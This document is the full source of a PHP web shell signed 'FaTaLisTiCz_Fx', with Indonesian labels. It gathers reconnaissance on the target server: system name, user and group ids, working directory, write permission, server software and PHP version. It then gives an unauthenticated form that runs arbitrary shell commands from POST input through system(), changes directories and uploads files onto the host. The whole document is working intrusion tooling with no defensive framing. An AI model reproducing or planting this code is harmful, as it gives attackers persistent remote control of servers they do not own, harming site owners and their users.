<title></title>
<body>

<div align="center">
</font></p>
  <hr><hr>
  <p> <font face="Verdana" style="font-size: 9pt"><b>
  <br>
  
  </b>
  
  </font><font face="Verdana">
  </p>
<div align="center"><b>
    </style>

    <font face="Verdana" color="black" size="4">
    <b>
    -= Touch by FaTaLisTiCz_Fx =-</b></p></div></td></tr><tr><td>
<hr size="1" align="center" width="50%"></td></tr></table><table width="90%" border="0" align="center" cellpadding="2" cellspacing="0"><tr><td> 
<div align="center">
    <font face="Verdana" size="2">Informasi Server TarGeT</font></div></td></tr><tr><td><font face="Verdana" size="2"> 
<?php
  closelog( );
  $user = get_current_user( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $ver = phpversion( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );
  if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
  $uname = posix_uname( );
  while (list($info, $value) = each ($uname)) {
?>
  <TR>
    <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><span style="font-size: 9pt"><b>
        <?= $info ?>
      :</b> <?= $value ?></DIV></TD>
  </TR>
<?php
  }
?>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <span style="font-size: 9pt"><b>
    User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <span style="font-size: 9pt"><b>
    Current Path:</b> <?= $chdir ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <span style="font-size: 9pt"><b>
    Permission Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?>
    </span></DIV></TD>
  </TR>  
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <span style="font-size: 9pt"><b>
    Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>
    </span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <span style="font-size: 9pt"><b>
    Server Address:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
    </span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <span style="font-size: 9pt"><b>
    Script Current User:</b> <?= $user ?></span></DIV></TD>
  </TR>
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;">
    <span style="font-size: 9pt"><b>
    PHP Version:</b> <?= $ver ?></span></DIV></TD>
  </TR>
</TABLE>
            </b>
</div></font></div>

<?php

set_magic_quotes_runtime(0);

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;
$Ls     = `ls -al`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

if( $_POST['_act'] == "List files!" ) {
    $currentCMD = "ls -la";
}


print "<form method=post enctype=\"multipart/form-data\"><hr><hr><table>";

print "<tr><td><b>Execute CMD:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Execute!\"></td></tr>";

print "<tr><td><b>Change Dir:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List files!\"></td></tr>";

print "<tr><td><b>Upload File:</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "</table></form><hr><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Upload!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Error while uploading file!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>File uploaded successfully!</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
  system("$currentCMD 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm 
/tmp/cmdtemp");
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
}

exit;

?></body></font></b></font> 